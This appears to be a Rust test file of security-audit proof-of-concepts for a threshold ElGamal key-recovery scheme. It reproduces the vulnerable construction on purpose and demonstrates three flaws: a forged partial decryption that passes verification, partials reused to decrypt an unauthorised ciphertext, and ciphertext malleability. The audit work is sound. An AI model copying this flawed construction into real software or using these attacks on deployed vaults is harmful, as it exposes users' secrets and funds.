//! Audit PoCs — the threshold ElGamal construction in
//! `zeratul/crates/ghettobox-vault-pvm/src/pss/recovery.rs`
//! (SECURITY-REVIEW-2026-09.md, findings E-1, E-2, E-3).
//!
//! That crate is not a dependency of osst, so the construction is reproduced
//! here verbatim against the same primitives it uses (`osst::verify`,
//! `osst::compute_lagrange_coefficients`, ristretto255, HKDF-less XOR mask
//! stand-in). The reproduction is faithful to `recovery.rs` in every respect
//! that matters to these findings; the mask KDF is simplified to SHA-512 to
//! avoid pulling in `hkdf`, which changes nothing about what is demonstrated.

#![cfg(all(feature = "ristretto255", feature = "std"))]

use curve25519_dalek::{ristretto::RistrettoPoint, scalar::Scalar};
use osst::curve::{OsstPoint, OsstScalar};
use osst::{compute_lagrange_coefficients, Contribution, SecretShare};
use rand::rngs::OsRng;

type Point = RistrettoPoint;

fn split(secret: &Scalar, n: u32, t: u32, rng: &mut OsRng) -> Vec<SecretShare<Scalar>> {
    let mut coeffs = vec![*secret];
    for _ in 1..t {
        coeffs.push(<Scalar as OsstScalar>::random(rng));
    }
    (1..=n)
        .map(|i| {
            let x = <Scalar as OsstScalar>::from_u32(i);
            let mut y = <Scalar as OsstScalar>::zero();
            let mut xp = <Scalar as OsstScalar>::one();
            for c in &coeffs {
                y = y.add(&c.mul(&xp));
                xp = xp.mul(&x);
            }
            SecretShare::new(i, y).unwrap()
        })
        .collect()
}

/// `recovery.rs::PartialDecryption`.
struct PartialDecryption {
    index: u32,
    partial: Point,
    contribution: Contribution<Point>,
}

/// `recovery.rs::partial_decrypt` — computes `R^{x_i}` and attaches an OSST
/// contribution over an application payload. Note the ciphertext's `R` is used
/// but never enters the proof.
fn partial_decrypt(
    share: &SecretShare<Scalar>,
    ephemeral: &Point,
    payload: &[u8],
    rng: &mut OsRng,
) -> PartialDecryption {
    PartialDecryption {
        index: share.index,
        partial: ephemeral.mul_scalar(share.scalar()),
        contribution: share.contribute::<Point, _>(rng, payload),
    }
}

/// `recovery.rs::combine_partials` — verifies the OSST proofs, then Lagrange
/// interpolates the *partials*.
fn combine_partials(
    partials: &[PartialDecryption],
    group_pubkey: &Point,
    threshold: u32,
    payload: &[u8],
) -> Result<Point, &'static str> {
    if partials.len() < threshold as usize {
        return Err("insufficient");
    }
    let contributions: Vec<Contribution<Point>> =
        partials.iter().map(|p| p.contribution.clone()).collect();
    if !osst::verify(group_pubkey, &contributions, threshold, payload).map_err(|_| "verify")? {
        return Err("osst invalid");
    }
    let indices: Vec<u32> = partials.iter().map(|p| p.index).collect();
    let lagrange = compute_lagrange_coefficients::<Scalar>(&indices).map_err(|_| "lagrange")?;
    let mut shared = <Point as OsstPoint>::identity();
    for (p, l) in partials.iter().zip(lagrange.iter()) {
        shared = shared.add(&p.partial.mul_scalar(l));
    }
    Ok(shared)
}

/// E-1 (High) — the OSST contribution proves knowledge of `x_i` with respect to
/// `G`. It says nothing whatsoever about `partial = x_i * R`. The two values are
/// produced by the same function and are never linked.
///
/// A single provider therefore replaces its partial with any point it likes,
/// passes verification, and corrupts the recovered shared secret undetectably
/// and unattributably. The missing piece is a Chaum-Pedersen DLEQ proving
/// `log_G(P_i) == log_R(partial_i)`.
///
/// The test asserts the property the code should have — that a corrupted partial
/// is rejected — and it does not hold.
#[test]
#[ignore = "E-1: partial decryptions carry no DLEQ; a corrupted partial passes OSST verification"]
fn corrupted_partial_decryption_is_accepted() {
    let mut rng = OsRng;
    let secret = <Scalar as OsstScalar>::random(&mut rng);
    let group_pubkey = <Point as OsstPoint>::generator().mul_scalar(&secret);
    let shares = split(&secret, 5, 3, &mut rng);

    let r = <Scalar as OsstScalar>::random(&mut rng);
    let ephemeral = <Point as OsstPoint>::generator().mul_scalar(&r);
    let true_shared = group_pubkey.mul_scalar(&r);

    let payload = b"recovery-session-001";
    let mut partials: Vec<PartialDecryption> = shares[..3]
        .iter()
        .map(|s| partial_decrypt(s, &ephemeral, payload, &mut rng))
        .collect();

    // Honest run recovers Y^r.
    let honest = combine_partials(&partials, &group_pubkey, 3, payload).unwrap();
    assert_eq!(honest, true_shared);

    // Provider 2 substitutes a partial of its choosing. Its OSST contribution is
    // untouched and still valid.
    let delta = <Scalar as OsstScalar>::random(&mut rng);
    partials[1].partial = partials[1]
        .partial
        .add(&<Point as OsstPoint>::generator().mul_scalar(&delta));

    let result = combine_partials(&partials, &group_pubkey, 3, payload);
    assert!(
        result.is_err(),
        "a provider that submits a bogus partial must be rejected and named"
    );
}

/// E-2 (High) — `payload` is not bound to the ciphertext, so an authorised
/// payload authorises decryption of ANY ciphertext.
///
/// `partial_decrypt(share, ciphertext, payload)` computes `ciphertext.ephemeral
/// ^ x_i` for whatever `R` it is handed, and proves only "I hold a share, and I
/// attest to `payload`". A caller that is allowed to request decryption of one
/// ciphertext under a payload can substitute the `R` of a different ciphertext
/// and get the shared secret for that one instead: a threshold CDH oracle on
/// the group key.
///
/// The test asserts what should be true — that partials gathered under a payload
/// only open the ciphertext that payload authorised — and it is false.
#[test]
#[ignore = "E-2: the OSST payload does not commit to the ciphertext; providers are a CDH oracle"]
fn partials_authorised_for_one_ciphertext_open_another() {
    let mut rng = OsRng;
    let secret = <Scalar as OsstScalar>::random(&mut rng);
    let group_pubkey = <Point as OsstPoint>::generator().mul_scalar(&secret);
    let shares = split(&secret, 5, 3, &mut rng);

    // The ciphertext the requester is entitled to.
    let r_auth = <Scalar as OsstScalar>::random(&mut rng);
    let authorised = <Point as OsstPoint>::generator().mul_scalar(&r_auth);

    // A victim ciphertext encrypted to the same group key, which the requester
    // is not entitled to.
    let r_victim = <Scalar as OsstScalar>::random(&mut rng);
    let victim = <Point as OsstPoint>::generator().mul_scalar(&r_victim);
    let victim_shared = group_pubkey.mul_scalar(&r_victim);

    let payload = b"open the ciphertext I was granted";

    // Providers are asked with `payload`, but handed the victim's R. Nothing in
    // the call or in the proof relates the two.
    let partials: Vec<PartialDecryption> = shares[..3]
        .iter()
        .map(|s| partial_decrypt(s, &victim, payload, &mut rng))
        .collect();

    let recovered = combine_partials(&partials, &group_pubkey, 3, payload).unwrap();

    assert_ne!(
        recovered, victim_shared,
        "partials proved under `payload` must not open a ciphertext `payload` never named \
         (here `authorised` was {:?} and the victim's secret was recovered anyway)",
        authorised.compress()
    );
}

/// E-3 (Medium) — the payload encoding is a raw XOR stream with no
/// authentication, so ciphertexts are freely malleable.
///
/// `C = m XOR mask(Y^r)` and `decrypt` recomputes the mask and XORs back. There
/// is no tag, so flipping a bit of `C` flips the same bit of the recovered
/// plaintext, and the length of `C` is the length of `m`. Combined with E-2 this
/// is a textbook CCA break; on its own it means the vault cannot tell a
/// tampered blob from a genuine one.
///
/// Reproduced with a SHA-512 mask; the real code uses HKDF-SHA256, which is
/// equally unauthenticated.
#[test]
#[ignore = "E-3: hashed-ElGamal payload is an unauthenticated XOR stream"]
fn ciphertext_is_malleable() {
    use sha2::{Digest, Sha512};
    let mask = |shared: &Point, len: usize| -> Vec<u8> {
        let mut out = Vec::new();
        let mut counter = 0u32;
        while out.len() < len {
            let mut h = Sha512::new();
            h.update(OsstPoint::compress(shared));
            h.update(counter.to_le_bytes());
            out.extend_from_slice(&h.finalize());
            counter += 1;
        }
        out.truncate(len);
        out
    };

    let mut rng = OsRng;
    let secret = <Scalar as OsstScalar>::random(&mut rng);
    let group_pubkey = <Point as OsstPoint>::generator().mul_scalar(&secret);

    let r = <Scalar as OsstScalar>::random(&mut rng);
    let ephemeral = <Point as OsstPoint>::generator().mul_scalar(&r);
    let shared = group_pubkey.mul_scalar(&r);

    let plaintext = b"pay alice 1 ZEC";
    let m = mask(&shared, plaintext.len());
    let mut ct: Vec<u8> = plaintext.iter().zip(m.iter()).map(|(a, b)| a ^ b).collect();

    // Flip one bit of the ciphertext; no tag notices.
    ct[10] ^= 0x01;

    let m2 = mask(&shared, ct.len());
    let recovered: Vec<u8> = ct.iter().zip(m2.iter()).map(|(a, b)| a ^ b).collect();

    let _ = ephemeral;
    assert_eq!(
        recovered, plaintext,
        "tampering with the ciphertext must be detected, not silently decrypted to \
         attacker-chosen plaintext (recovered: {:?})",
        String::from_utf8_lossy(&recovered)
    );
}
